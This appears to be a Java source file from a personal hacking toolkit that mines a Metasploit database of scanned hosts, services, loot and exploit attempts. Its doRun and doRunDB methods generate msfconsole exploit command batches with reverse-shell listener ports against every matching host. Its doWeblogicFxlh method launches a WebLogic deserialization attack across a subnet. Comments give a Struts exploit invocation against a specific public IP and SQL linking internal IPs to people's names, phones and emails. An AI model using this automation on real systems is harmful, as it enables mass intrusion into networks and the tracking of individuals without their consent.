package com.mtx.xiatian.hacker.metasploit;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.TreeMap;

import com.mtx.xiatian.hacker.CommonTools;
import com.mtx.xiatian.hacker.MTX_AttackWeblogic;
import com.sensepost.reDuh.Base64;
/**<pre>
 * 查询metasploit-framework的数据库
 * 表信息：
 * msf.clients 记录数：23
msf.events: 1万
msf.events 记录数：11135
msf.exploit_attempts 记录数：3056
msf.hosts 记录数：363
msf.loots 记录数：4
msf.metasploit_credential_cores 记录数：4
msf.metasploit_credential_logins 记录数：14
msf.metasploit_credential_origin_services 记录数：14
msf.metasploit_credential_privates 记录数：4
msf.metasploit_credential_publics 记录数：4
msf.module_actions 记录数：172
msf.module_archs 记录数：1627
msf.module_authors 记录数：5983
模块信息
msf.module_details 记录数：3261
msf.module_platforms 记录数：2885
msf.module_refs 记录数：7607
模块应用的环境、版本
msf.module_targets 记录数：3104

nmap扫描的信息（notes：service_id,host_id）
msf.notes 记录数：1582

msf.refs 记录数：4
msf.schema_migrations 记录数：147

扫描到的服务信息（name为服务类型，例如http；服务名：info，关键主机host_id）
msf.services 记录数：1999

msf.session_events 记录数：63
msf.sessions 记录数：3
msf.vuln_attempts 记录数：3
msf.vulns 记录数：4
msf.vulns_refs 记录数：9

曾经扫描过的web url
msf.web_sites 记录数：96
曾经找到的web的漏洞信息记录
msf.web_vulns 记录数：13
msf.workspaces 记录数：4

 * vuln_attempts、vulns、vulns_refs、refs  曾经攻击成功的记录（loot_id、module、vuln_id、session_id）
 * web_sites 攻击过的web站点
 * web_vulns 成功攻击的漏洞
 * workspaces 工作区信息
 * </pre>
 * @author xiatian
 * 
 */
public class QueryMSF4 extends CommonTools
{
	public QueryMSF4()
	{
		setConnInfo("jdbc:postgresql://127.0.0.1:5433/msf", "msf", "miracle***");
	}
	/**<pre>
	 * 服务信息
	 * {created_at=2016-07-25 10:10:58.593738, host_id=249, 
	 * id=12960, info=MySQL 5.5.37, name=mysql, port=3306, 
	 * proto=tcp, state=open, updated_at=2016-07-25 10:10:58.593738}
	 * </pre>
	 * @param list
	 */
	public void getServices(List<TreeMap<String, Object>> list)
	{
		getTable("services", list);
	}
	
	/**
	 * 获取服务的：ip、mac、服务名
	 * {address=192.168.10.214, info=MySQL 5.5.34-MariaDB, mac=76:19:4a:d7:31:e9, os_name=Windows 2008 R2, port=3306}
	 * @param list
	 * @param k
	 */
	public void getServices(List<TreeMap<String, Object>> list, String ...k)
	{
		StringBuffer buf = new StringBuffer();
		for(String s: k)
		{
			buf.append(" and a.info ~* '" + s + "'");
		}
		query("select b.address, b.os_name, b.mac, a.info,a.port from services a, hosts b where a.host_id = b.id " + buf.toString(), list);
	}
	
	/**<pre>
	 * nmap扫描的信息
	 *{created_at=2016-07-27 01:02:45.776046, critical=null, 
	 *data=BAh7BiILb3V0cHV0IiNTZXJ2ZXIgc3VwcG9ydHMgU01CdjIgcHJvdG9jb2w=
, host_id=387, id=2875, ntype=nmap.nse.smbv2-enabled.host,
 seen=null, service_id=null, updated_at=2016-07-27 01:02:45.776046, 
 vuln_id=null, workspace_id=2}
	 * </pre>
	 * @param list
	 */
	public void getNotes(List<TreeMap<String, Object>> list)
	{
		getTable("notes", list);
	}
	
	/**<pre>
	 * 模块针对的平台信息
	 *{detail_id=32270, id=30163, index=0, name=Windows x86}
	 * </pre>
	 * @param list
	 */
	public void getModule_targets(List<TreeMap<String, Object>> list)
	{
		getTable("module_targets", list);
	}
	
	
	/**<pre>
	 * 模块安全编号，或者是参考连接信息
	 *{detail_id=32270, id=75062, name=CVE-2016-0099}
{detail_id=32270, id=75063, 
name=URL-https://twitter.com/FuzzySec/status/723254004042612736}
	 * </pre>
	 * @param list
	 */
	public void getModule_refs(List<TreeMap<String, Object>> list)
	{
		getTable("module_refs", list);
	}
	
	
	/**<pre>
	 * 获取模块详细信息
	 *{default_action=null, default_target=null, description=This 
	 *module causes a hypervisor crash in Xen 4.2.0 when invoked from a
        paravirtualised VM, including from dom0. 
         Successfully tested on Debian 7
        3.2.0-4-amd64 with Xen 4.2.0., disclosure_date=null, 
        file=/Users/xiatian/safe/metasploit-framework/modules/post/linux/dos/xen_420_dos.rb,
         fullname=post/linux/dos/xen_420_dos, id=32271, 
         license=Metasploit Framework License (BSD), 
         mtime=2016-07-18 02:20:48.0, mtype=post, 
         name=Linux DoS Xen 4.2.0 2012-5525, privileged=false, rank=300,
          ready=true, refname=linux/dos/xen_420_dos, stance=null}
        
        "select * from module_details where  description~*'Debian' and description~*'3.2.0' "
	 * </pre>
	 * @param list
	 */
	public void getModule_details(List<TreeMap<String, Object>> list)
	{
		getTable("module_details", list);
	}
	/**<pre>
	 * 获取平台信息
	 *{detail_id=32270, id=27881, name=windows}
	 * module_authors： 模块作者信息表
	 * </pre>
	 * @param list
	 */
	public void getModule_platforms(List<TreeMap<String, Object>> list)
	{
		getTable("module_platforms", list);
	}
	
	/**<pre>
	 * 获取模块支持的平台信息
	 * {detail_id=32271, id=15536, name=x86_64}
	 * module_authors： 模块作者信息表
	 * </pre>
	 * @param list
	 */
	public void getModule_archs(List<TreeMap<String, Object>> list)
	{
		getTable("module_archs", list);
	}
	/**<pre>
	 * 获取模块名
	 * {detail_id=30048, id=1484, name=WebServer}
	 * </pre>
	 * @param list
	 */
	public void getModule_actions(List<TreeMap<String, Object>> list)
	{
		getTable("module_actions", list);
	}
	
	/**<pre>
	 * 已经发现的漏洞信息
	 * {content_type=text/plain, created_at=2016-06-24 07:12:46.932282, 
	 * data=null, host_id=202, id=2, info=MySQL Schema,
	 *  ltype=mysql_schema, module_run_id=null, 
	 *  name=192.168.10.161_mysql_schema.txt, 
	 *  path=/Users/xiatian/.msf4/loot/20160624151246_gszb_192.168.10.161_mysql_schema_737765.txt, 
	 *  service_id=11813, updated_at=2016-06-24 07:12:46.932282, workspace_id=2}
	 * </pre>
	 * @param list
	 */
	public void getLoots(List<TreeMap<String, Object>> list)
	{
		getTable("loots", list);
	}
	/**
	 * 获取客户端浏览器信息，主键：host_id
	 * 
	 * @param list
	 */
	public void getClients(List<TreeMap<String, Object>> list)
	{
		getTable("clients", list);
	}
	
	/**<pre>
	 * 历史中攻击信息
	 * {attempted_at=2016-07-05 05:30:43.513595, exploited=false, 
	 * fail_detail=No session created, fail_reason=payload-failed, 
	 * host_id=57, id=2971, loot_id=null, 
	 * module=exploit/windows/isapi/rsa_webagent_redirect, 
	 * port=80, proto=tcp, service_id=null, session_id=null, 
	 * username=xiatian, vuln_id=null}
	 * </pre>
	 * @param list
	 */
	public void getExploit_attempts(List<TreeMap<String, Object>> list)
	{
		getTable("exploit_attempts", list);
	}
	
	
	/**<pre>
	 * 获取主机信息
	 * {address=192.168.10.149, arch=x86, comm=, comments=null, 
	 * created_at=2016-06-15 09:09:36.375048, cred_count=0, detected_arch=null, 
	 * exploit_attempt_count=0, host_detail_count=0, id=256, info=null, 
	 * mac=ba:eb:b7:a9:51:6b, name=null, note_count=10, os_flavor=null, 
	 * os_lang=zh-cn, os_name=Windows 7, os_sp=SP1, purpose=client, 
	 * scope=null, service_count=13, state=alive, 
	 * updated_at=2016-07-25 10:10:38.183457, virtual_host=null, 
	 * vuln_count=0, workspace_id=2}
	 *   
	 *   select * from hosts where not arch is null and not os_name is null and not mac is null
	 * </pre>
	 * @param list
	 */
	public void getHosts(List<TreeMap<String, Object>> list)
	{
		getTable("hosts", list);
	}
	
	/**
	 * 获取客户端浏览器信息，主键：host_id
	 * @param list
	 */
	public void getEvents(final List<TreeMap<String, Object>> list)
	{
		getTable("events", new ArrayList<TreeMap<String, Object>>()
		{
            private static final long serialVersionUID = 3304419563297044899L;

			public boolean add(TreeMap<String, Object> m)
			{
				m.put("info", Base64.decode(String.valueOf(m.get("info"))));
				list.add(m);
				return true;
			}
		});
	}
	
	/**<pre>
	 * 获取事件信息
	 * created_at=2016-07-05 04:30:54.955268, critical=null, host_id=null, 
	 * id=4503, info=
	 * name=module_error, seen=null, updated_at=2016-07-05 04:30:54.955268, 
	 * username=xiatian, workspace_id=1
	 * </pre>
	 * @param list
	 */
	public void getTable(String tb, List<TreeMap<String, Object>> list)
	{
		query("select * from " + tb, list);
	} 
	
	/**
	 * 获取主机系统统计信息
	 */
	public void getAllHostVerInfo()
	{
		List<TreeMap<String, Object>> list = new ArrayList<TreeMap<String, Object>>()
		{
			public boolean add(TreeMap<String, Object> m)
			{
				System.out.println(m.get("czxt") + "\t" + m.get("czxtcnt"));
				return true;
			}
		};
		// state='alive' and 
		query("select  os_name as czxt,count(1) as czxtcnt from hosts  where os_name!='null'" +
//				" and os_name!='Unknown'" +
				" and  workspace_id=2 and text(address) like '192.168.%'  group by os_name order by czxtcnt desc",
		        list);
	}
	
	/**
	 * 服务统计
	 */
	public void getAllServicesInfo()
	{
		List<TreeMap<String, Object>> list = new ArrayList<TreeMap<String, Object>>()
		{
			public boolean add(TreeMap<String, Object> m)
			{
				System.out.println(m.get("name") + "\t" + m.get("zc"));
				return true;
			}
		};
		// state='alive' and 
		query("select k.name, count(1) zc from (select  b.address, a.name from services a, hosts b where b.os_name!='null'" +
//				" and b.os_name!='Unknown'" +
				" and text(b.address) like '192.168.%' and b.workspace_id=2 and b.id=a.host_id and b.name!='null' group by b.address, a.name) as k group by k.name order by zc desc", list);
	}
	
	/**
	 * 反序列化测试
	 */
	public void doWeblogicFxlh()
	{
		final MTX_AttackWeblogic ma = new MTX_AttackWeblogic();
//		final String szIps = "192.168.10.196,192.168.10.138,192.168.10.133,192.168.10.188";
		List<TreeMap<String, Object>> list = new ArrayList<TreeMap<String, Object>>()
				{
					public boolean add(TreeMap<String, Object> m)
					{
						String ip = String.valueOf(m.get("address"));
//						if(-1 < szIps.indexOf(ip))
						if(ip.startsWith("192.168.10."))
							ma.connSvr(ip, String.valueOf(m.get("port")), null, null);
						return true;
					}
				};
				query("select b.address, a.port from services a, hosts b where b.id=a.host_id  and a.info like '%WebLogic Server%'", list);
	}
	
	/**
	 * 查询符合要求的模块
	 * @param k
	 */
	public void doSearchModel(List<TreeMap<String, Object>> list, String ...k)
	{
		if(null == list)
		list = new ArrayList<TreeMap<String, Object>>()
				{
					public boolean add(TreeMap<String, Object> m)
					{
						System.out.println(m);
						return true;
					}
				};
		String szKey1 = "", szKey2 = "";
		for(String x: k)
		{
			x = x.replaceAll("([\\.\\*])", "\\\\$1");
			if(0 < szKey1.length())szKey1 += " and ";
			szKey1 += "name  ~*  '.*" + x + ".*'";
			if(0 < szKey2.length())szKey2 += " and ";
			szKey2 += "description  ~*  '.*" + x + ".*'";
		}
		if(0 < szKey1.length())szKey1 = "(" + szKey1 + ")";
		if(0 < szKey2.length())szKey2 = "(" + szKey2 + ")";
		String szSqql = "select fullname,name from module_details where " + szKey1 + " or " + szKey2;
		System.out.println(szSqql);
		query( szSqql, list);
	}
	
	/**
	 * 指定进行调用msf.doRun("219.159.250.144", "80", "/gxglwx/userAccountAction!register.do","struts");
	 * @param ip
	 * @param port
	 * @param url
	 * @param k
	 */
	public void doRun(final String ip, final String port, final String url, String ...k)
	{
		List<TreeMap<String, Object>> list = new ArrayList<TreeMap<String, Object>>()
				{
			private int n = 4444;
			public boolean add(TreeMap<String, Object> m)
			{
				System.out.println("use " + m.get("fullname"));
				System.out.println("set RHOST " + ip);
				System.out.println("set LHOST 0.0.0.0");
				System.out.println("set LPORT " + (n++));
				System.out.println("set RPORT " + port);
				System.out.println("set TARGETURI " + url);
				System.out.println("run -j ");
				return true;
			}
		};
		doSearchModel(list, k);
	}
	
	/**
	 * 指定进行调用msf.doRun("219.159.250.144", "80", "/gxglwx/userAccountAction!register.do","struts");
	 * @param ip
	 * @param port
	 * @param url
	 * @param k
	 */
	public void doRunDB(String k)
	{
		final List<TreeMap<String, Object>> list1 = new ArrayList<TreeMap<String, Object>>();
		// 查询服务：ip、端口、
		query("select b.address,a.name,a.info,a.port from services a, hosts b where b.id = a.host_id and (a.name ~* '" + k + "' or a.info  ~* '" + k + "')", list1);
		List<TreeMap<String, Object>> list = new ArrayList<TreeMap<String, Object>>()
				{
			private int n = 4444;
			public boolean add(TreeMap<String, Object> m)
			{
				for(TreeMap<String, Object> m1: list1)
				{
					String ip = m1.get("address").toString();
					if(ip.startsWith("192.168.10."))
					{
						System.out.println("use " + m.get("fullname"));
						
						System.out.println("set RHOSTS " + ip);
						System.out.println("set RHOST " + ip);
						System.out.println("set RPORT " + m1.get("port"));
						System.out.println("set LHOST 0.0.0.0");
						System.out.println("set LPORT " + (n++));
	//					System.out.println("set TARGETURI " + url);
						System.out.println("run -j ");
					}
				}
				return true;
			}
		};
		doSearchModel(list, k);
	}
	
	/**
	 * <pre>
	 * 内网ip和人关联：发现内网ip变化太大，无法定位到人
	 * select a.fullname, a.phone, a.email,b.INERIP,b.broswerinfo from qiperson a, qirecord b
  where a.PERSONID = b.PERSONID and not b.INERIP is null  group by a.fullname, a.phone, a.email,b.INERIP,b.broswerinfo order by a.fullname
  
  select a.fullname, a.phone, a.email,b.INERIP from qiperson a, qirecord b
  where a.PERSONID = b.PERSONID and not b.INERIP is null  group by a.fullname, a.phone, a.email,b.INERIP order by a.fullname
  </pre>
	 */
	public void doIpForRen()
	{
		;
	}
	
	/**
	 * @param args
	 */
	public static void main(String[] args)
	{
		final QueryMSF4 msf = new QueryMSF4();
		final Map <String,String>m1 = new HashMap<String,String>();
		
		List<TreeMap<String, Object>> list = new ArrayList<TreeMap<String, Object>>()
		{
			int n = 4444;
			public boolean add(TreeMap<String, Object> m)
			{
//				String ip = m.get("address").toString();
//				if(ip.startsWith("192.168."))
//				{
//					System.out.println("set RHOST " + ip);
//					System.out.println("set LPORT " + (n++));
//					System.out.println("run -j");
//				}
//				 System.out.println(m.get("name") + "\t" + m.get("z"));
				
//				System.out.println("<tr><td>" + m.get("address") +"<td>" + m.get("name") +"<td>" +m.get("info") );
//				System.out.println( m.get("address") +"\t"  +m.get("info") );
//				System.out.println(m);
//				super.add(m);
				return true;
			}
		};
//		System.out.println("<table>");
		// (a.info  ~* 'Microsoft Windows XP') and
//		msf.query("select b.address,a.name,a.info from vulns a, hosts b where a.host_id = b.id", list);
//		msf.query("select b.address,a.info from loots a, hosts b where b.id = a.host_id and a.info = 'MS15-034 HTTP.SYS Memory Dump'", list);
//		msf.query("select b.address,a.name,a.info,a.port from services a, hosts b where b.id = a.host_id and a.port=445", list);
		msf.doWeblogicFxlh();
//		msf.getAllServicesInfo();
//		msf.getAllHostVerInfo(); // 192.168.2.1-192.168.10.142
		// msrpc  netbios
//		msf.doRunDB("msrpc");
//		msf.query("select b.address,a.name,a.info,a.port from services a, hosts b where b.id = a.host_id and (a.name ~* 'iis' or a.info  ~* 'iis')", list);
		// 
//		msf.query("select  *  from hosts  where state='alive' and text(address) like '192.168.%'  and mac is null", list);
//		msf.doRun("219.159.250.144", "80", "/gxglwx/userAccountAction!register.do","struts");
//		 msf.query("select  os_name as czxt,count(1) as czxtcnt from hosts  where state='alive' and text(address) like '192.168.%'  group by os_name order by czxtcnt desc", list);
//		msf.query("select  * from hosts  where state!='alive'", list);
//		msf.query("select  info,count(1) a from  services where name='mysql' group by info order by a desc", list);
//		msf.query("select  b.address, a.port from services a, hosts b where b.id=a.host_id  and a.info like '%WebLogic%'", list);
//		msf.query("select k.name, count(1) zc from (select  b.address, a.name from services a, hosts b where b.os_name!='null' and b.os_name!='Unknown' and text(b.address) like '192.168.%' and b.workspace_id=2 and b.id=a.host_id and b.name!='null' group by b.address, a.name) as k group by k.name order by zc desc", list);
//		msf.query("select  a.name, count(1) z from services a, hosts b where" +
//				"  b.os_name!='null' and b.os_name!='Unknown' and text(b.address) like '192.168.%'" +
//				" and b.workspace_id=2 and b.id=a.host_id and  a.name='msrpc'  " +
//				" group by a.name order by z", list);
//		System.out.println(m1.size());
//		msf.getServices(list, "mysql", "5.5");
//		msf.getServices(list);
//		System.out.println(list.size());
	}
}
